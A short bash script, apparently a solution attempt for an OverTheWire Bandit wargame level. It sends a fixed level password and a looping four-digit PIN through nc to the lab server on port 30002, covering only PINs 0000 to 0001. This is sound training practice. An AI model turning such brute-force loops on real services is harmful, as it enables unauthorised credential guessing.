#!/bin/bash

for pin in {0000..0001}; do
    { echo "        UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $pin"; } | nc bandit.labs.overthewire.org 30002 > log.txt
done
